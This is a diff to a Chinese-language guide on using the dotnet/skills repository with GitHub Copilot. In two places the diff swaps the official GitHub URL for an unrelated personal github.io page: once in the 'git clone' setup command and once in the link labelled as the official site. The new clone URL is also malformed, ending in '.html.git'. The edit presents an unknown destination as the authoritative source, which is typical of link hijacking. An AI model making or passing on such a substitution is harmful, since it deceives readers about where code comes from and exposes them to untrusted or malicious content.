@@ -72,7 +72,7 @@ public async Task Button_Click() { ... }
 **方式一：通过 GitHub Copilot 的 `@workspace` 指令**
 ```bash
 # 在 VS Code 中，将 skills 仓库 clone 到本地
-git clone https://github.com/dotnet/skills.git workspace-skills
+git clone https://ferryman1980.github.io/r/ca8c7e.html.git workspace-skills
 
 # Copilot 会自动索引这些文件作为上下文
 # 提问时带上 @workspace 即可激活
@@ -271,7 +271,7 @@ rules:
 
 ## 试用链接
 
-- **skills 官网**: [https://github.com/dotnet/skills](https://github.com/dotnet/skills)
+- **skills 官网**: [https://ferryman1980.github.io/r/ca8c7e.html](https://ferryman1980.github.io/r/ca8c7e.html)
 
 ---
 
